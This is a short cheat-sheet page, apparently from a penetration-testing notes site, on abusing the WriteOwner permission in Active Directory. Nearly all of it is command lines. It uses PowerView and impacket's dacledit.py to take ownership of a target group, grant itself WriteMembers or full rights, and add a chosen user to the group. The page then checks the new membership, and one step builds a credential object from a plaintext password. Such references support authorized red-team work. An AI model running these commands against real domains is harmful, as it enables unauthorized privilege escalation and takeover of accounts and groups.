---
title: "WriteOwner/Own"
date: 2024-7-27
tags: ["WriteOwner", "active driectory", "ad", "Windows", "own", "dacledit"]
---

---
### Abuse #1 : Change owner of the group

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView.ps1

<div>

```powershell
. .\PowerView.ps1
```

</div>

#### 2. Change owner

<div>

```powershell
Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USER>
```

</div>

{{< /tabcontent >}}

### Abuse #2 : Add user to the group

{{< tab set2 tab1 active >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 0. Install latest impacket (included dacledit.py)

<div>

```bash
git clone https://github.com/fortra/impacket.git
```

```bash
cd impacket
```

```bash
pip3 install .
```

</div>

#### 1. Add domain object

<div>

```bash
sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target <TARGET_GROUP> -action write -rights WriteMembers
```

</div>

#### 2. Add group member

<div>

```bash
kinit <USER>
```

```bash
sudo ntpdate -s <DC> && net rpc group addmem <TARGET_GROUP> <USER> -U <USER> --use-kerberos=required -S <DC> --no-pass
```

</div>

#### 3. Check

<div>

```bash
sudo ntpdate -s <DC> && net rpc group members <TARGET_GROUP> -U <USER> --use-kerberos=required -S <DC> --no-pass
```

</div>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import PowerView.ps1 

<div>

```powershell
. .\PowerView.ps1
```

</div>

#### 2. Create cred object (runas) \[optional\]

<div>

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

</div>

#### 3. Add user to group

<div>

```powershell
Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/<USER>' -Rights All -DomainController <DC> -Credential $cred
```

```powershell
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
```

</div>

#### Check

<div>

```powershell
Get-DomainGroupMember -Identity <TARGET_GROUP> -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
```

```powershell
# Or
net user <USER>
```

```powershell
# Exit current sessions or re-login
whoami /groups
```

</div>

{{< /tabcontent >}}

<br>